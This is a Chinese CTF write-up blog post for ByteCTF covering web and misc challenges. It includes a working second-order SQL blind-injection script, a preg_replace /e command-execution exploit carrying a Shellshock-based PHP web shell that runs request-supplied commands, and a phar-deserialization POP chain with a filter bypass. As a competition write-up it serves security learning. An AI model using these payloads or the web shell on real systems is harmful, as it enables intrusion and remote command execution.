categories:
- 比赛
tags:
- wp
- ctf
title: bytectf wp
---
# bytectf wp

## web

### baby_blog


在edit.php中:

```php
if($_SESSION['id'] == $row['userid']){
		$title = addslashes($_POST['title']);
		$content = addslashes($_POST['content']);
		$sql->query("update article set title='$title',content='$content' where title='" . $row['title'] . "';");
	}
```
`$sql->query("update article set title='$title',content='$content' where title='" . $row['title'] . "';");`

$row['title'] 没有进行任何过滤,直接插入到sql语句中,而插入数据库中的title没有再次对引号进行转义,形成注入点

sql盲注判断脚本:

```python
import requests
from bs4 import BeautifulSoup
anti_disturb_key='cjb_ccreater_s_test'
PHPSESSID='404i3uiletdpke9rb0egs7vf47'
check_article_id=20
def check(check_title):
    url='http://112.125.24.134:9999/edit.php?id='+str(check_article_id)
    res=requests.get(url,cookies={'PHPSESSID':PHPSESSID})
    bs=BeautifulSoup(res.text, 'html.parser')
    title=bs.find('input',attrs={'name':"title"})['value']
    content=bs.find('textarea',attrs={'name':"content"}).text
    if title[:len(anti_disturb_key)]!=anti_disturb_key :
        return 'disturb'
    elif content!='success'+check_title:
        return 'false'
    else :
        return 'success'
    


def make_write(title,info):
    data={
        'title':title,
        'content':info
    }
    url='http://112.125.24.134:9999/writing.php'
    res=requests.post(url,data=data,cookies={'PHPSESSID':PHPSESSID})
    if res.status_code==200:
        return True
    else :
        return False

def get_newest_id():
    url='http://112.125.24.134:9999/index.php'
    res=requests.get(url,cookies={'PHPSESSID':PHPSESSID})
    bs=BeautifulSoup(res.text, 'html.parser')
    newest_id=bs.find('article').find('footer').find('a')['href']
    newest_id=newest_id[newest_id.index('=')+1:]
    return int(newest_id)

def sql_inject(sql):
    title=anti_disturb_key+"' or (id="+str(check_article_id)+" and ("+sql+'))#'
    info='success'+title
    if make_write(title,info):
        #编辑id=newest_id的文章来读取$raw['title']
        newest_id=get_newest_id()
        url='http://112.125.24.134:9999/edit.php'
        data={
            'title':title,
            'content':info,
            'id':newest_id
        }
        res=requests.post(url,cookies={'PHPSESSID':PHPSESSID},data=data)
        #判断盲注结果
        result=check(title)
        if result=='success':
            return True
        elif result=='disturb':
            print("受到干扰,重新执行")
            return sql_inject(sql)
        else :
            return False
    else :
        print('程序执行错误,请保持结果')
        eval(input('执行命令:'))
    
#demo 
#sql='(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),index,1)))=guess'
sql='''
(select''+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA='information_schema')=guess 
'''
### 数据库名:696e666f726d6174696f6e5f736368656d612c62616279626c6f67
#猜information_schema表名
#vip用户:wulaxc4ca4238a0b923820dcc509a6f75849b
result="4348415241435445525F534554532C434F4C4C4154494F4E532C434F4C4C4154494F4E5F4348415241435445525F5345545F4150504C49434142494C4954592C434F4C554D4E532c434f4c554d4e5f50524956494c454745532c454e47494e45532c4556454e54532c46494c45532c474c4f42414c5f5354415455532c474c4f42414c5f5641524941424c45532c4b45595f434f4c554d4e5f55534147452c504152414d45544552532c504152544954494f4e532c504c5547494e532c50524f434553534c4953542c50524f46494c494e472c5245464552454e5449414c5f434f4e53545241494e54532c524f5554494e45532c534348454d4154412c534348454d415f50524956494c454745532c53455353494f4e5f5354415455532c53455353494f4e5f5641524941424c45532c535441544953544943532c5441424c45532c5441424c455350414345532c5441424c455f434f4e53545241494e54532c5441424c455f50524956494c454745532c54524947474552532c555345525f50524956494c454745532c"

index=len(result)
while 1:
    index+=1
    temp=sql.replace('index',str(index))
    for i in range(20):
        print("猜测第"+str(index)+"位为:"+str(i))
        if sql_inject(temp.replace('guess',str(i))):
            result+=hex(i)[2:]
            break
    print(result)
    res=''
    for i in range(0,len(result),2):
        res+=chr(int(result[i:i+2],16))
    print(res)
        

```



filter=`(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(`|'|\").*?(`|'|\")|(\+|-|~|!|@:=|" . urldecode('%0B') . ").+?)FROM(\\(.+\\)|\\s+?.+?|(`|'|\").*?(`|'|\"))`
ban掉了select 语句
如果拿到vip权限可以用替换绕过
`(select''+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=database())=guess `绕过正则过滤

拿到vip账号:wulax,密码:1,网址:http://112.126.101.16:9999

看到replace.php里的preg_replace()猜测突破点在这里,利用`/e%00`来截断末尾的斜杠,从而达到命令执行的效果

命令执行利用脚本:

```python
import requests

url="http://112.126.101.16:9999"
arc_id="11"
session="5lrk8g0oh73su3q9dbfp9l79f2"
text='''
<?php 
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
# Google Dork: none 
# Date: 10/31/2014 
# Exploit Author: Ryan King (Starfall) 
# Vendor Homepage: http://php.net 
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
# Version: 5.* (tested on 5.6.2) 
# Tested on: Debian 7 and CentOS 5 and 6 
# CVE: CVE-2014-6271 

function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
   $tmp = tempnam(".","data"); 
   $headers =  'MIME-Version: 1.0' . "\r\n"; 
	$headers .= 'From: Your name <info@address.com>' . "\r\n";
	$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 

   putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1"); 
   // In Safe Mode, the user may only alter environment variableswhose names 
   // begin with the prefixes supplied by this directive. 
   // By default, users will only be able to set environment variablesthat 
   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
   // PHP will let the user modify ANY environment variable! 
   mail("a@127.0.0.1","","",$headers,"-bv"); // -bv so we don't actuallysend any mail 
   $output = @file_get_contents($tmp); 
   @unlink($tmp); 
   if($output != "") return $output; 
   else return "No output, or not vuln."; 
} 
echo shellshock($_REQUEST["cmd"]); 
?>
'''
def edit():
    data={
        "title":"bbb",
        "content":"b",
        "id":arc_id
    }
    return requests.post(url+"/edit.php",data=data,cookies={"PHPSESSID":session})
def exec(s):
    data={
        "replace":s,#"var_dump(scandir('/tmp'));var_dump(file_put_contents('/tmp/aaa.php',"+"$_POST['cmd']"+"));",
        "regex":"1",
        "id":arc_id,
        "find":"b/e\x00",
        "cmd":"ls -al",
        "filepath":"/tmp/hpdoger.php"
    }
    result=requests.post(url+"/replace.php",data=data,cookies={"PHPSESSID":session})
    edit()
    return result
while 1:
    print(exec(input()).text)
```

emmmm..到这里就不会做了.到头了.

后来发现有个antsystem()

vardump(antsystem('/readfile'));



### ezcms

哈希扩展攻击拿到admin权限

代码审计发现

在config.php下

```php
class File{
	public $filename;
    public $filepath;
    public $checker;
    function __construct($filename, $filepath)
    {
        $this->filepath = $filepath;
        $this->filename = $filename;
    }
    function __destruct()
    {
        if (isset($this->checker)){
            $this->checker->upload_file();
        }
    }
    public function view_detail(){

        if (preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this->filepath)){
            die("nonono~");
        }
        $mine = mime_content_type($this->filepath);
        $store_path = $this->open($this->filename, $this->filepath);
        $res['mine'] = $mine;
        $res['store_path'] = $store_path;
        return $res;

    }
}
```

过滤phar并且明明没有给`$checker`赋值的点,在销毁的时候却会调用它,明显是一个为了出题而写的地方猜测phar反序列化利用,而mime_content_type()恰好又是反序列化的利用点

最后在view.php处找到调用view_detail的地方

由于题目不限制.php文件的上传,但是题目会写一个非法.htaccess

所以我们可以可以试着删除它

构造pop链:

`FILE::view_detail(mime_content_type)->FILE::__destruct(upload_file())->Profile::__call(open())->ZipArchive::open(file,ZipArchive::OVERWRITE)`

phar文件生成后就是要考虑如何绕过`(^phar)`的限制,

我觉得这才是这一题最骚的地方:

`filepath=php://filter/resource=phar://sandbox/a87136ce5a8b85871f1d0b6b2add38d2/dd7ec931179c4dcb6a8ffb8b8786d20b.txt`

## misc

这次最开心的就是做misc的题目

### 签到题

### betgame

发现猜拳规律

计算机第一次出与被显示的选择克制的选择(显示:s,实际出:j)

计算机第二次出与克制显示的选择的选择(显示:s,实际出:b)

计算机第三次出显示的选择(显示:s,实际出:s)

然后手动pk :D

### **jigsaw**

![image.png](https://i.loli.net/2019/09/09/eDQhxkWYUsvZdVa.png)



